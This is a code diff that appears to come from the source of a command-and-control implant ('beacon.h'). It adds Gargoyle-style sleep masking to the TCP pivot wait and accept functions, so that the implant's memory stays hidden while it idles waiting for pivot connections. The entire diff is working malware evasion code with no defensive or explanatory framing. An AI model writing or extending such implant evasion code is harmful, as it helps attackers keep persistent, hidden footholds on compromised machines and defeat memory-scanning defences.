@@ -4,6 +4,7 @@
 #include <intrin.h>
 #include "beacon.h"
 #include "gargleint.h"
+#include "sleepmask_gen3.h"
 
 #define GARGLE_TCP_ACTION_RECV   0
 #define GARGLE_TCP_ACTION_ACCEPT 1
@@ -126,14 +127,44 @@ static void setup_trampoline2() {
 }
 
 void GargleWaitTCP(SOCKET s) {
-	/* INT3-placeholder trampoline (see gargle_pivot_smb.cpp): with a
-	 * mask-enabled profile this used to execute the template stub and
-	 * kill every TCP pivot listener. No-op = unmasked recv wait, the
-	 * proven nook == 0 posture. */
-	(void)s;
+	/* Phase 2 wait-window: idle-wait for socket data masked, in gen3
+	 * sleep slices (select() between windows is a microsecond syscall).
+	 * Guard semantics unchanged: threaded parents and nook==0 profiles
+	 * keep the plain behavior. */
+	if (setting_int(SETTING_GARGLE_NOOK) != 0 && threadcount == 0) {
+		struct timeval tv;
+		fd_set rd;
+
+		tv.tv_sec = 0;
+		tv.tv_usec = 0;
+		FD_ZERO(&rd);
+		FD_SET(s, &rd);
+		while (select(0, &rd, NULL, NULL, &tv) == 0) {
+			if (!gen3_sleep(700))
+				Sleep(700);
+			FD_ZERO(&rd);
+			FD_SET(s, &rd);
+		}
+	}
 }
 
 SOCKET GargleAccept(SOCKET s) {
-	/* Same trap: accept unmasked instead of executing the INT3 template. */
+	/* Phase 2 wait-window: idle-accept masked in gen3 slices, then a
+	 * plain (immediate) accept once the listener is readable. */
+	if (setting_int(SETTING_GARGLE_NOOK) != 0 && threadcount == 0) {
+		struct timeval tv;
+		fd_set rd;
+
+		tv.tv_sec = 0;
+		tv.tv_usec = 0;
+		FD_ZERO(&rd);
+		FD_SET(s, &rd);
+		while (select(0, &rd, NULL, NULL, &tv) == 0) {
+			if (!gen3_sleep(700))
+				Sleep(700);
+			FD_ZERO(&rd);
+			FD_SET(s, &rd);
+		}
+	}
 	return accept(s, NULL, 0);
 }
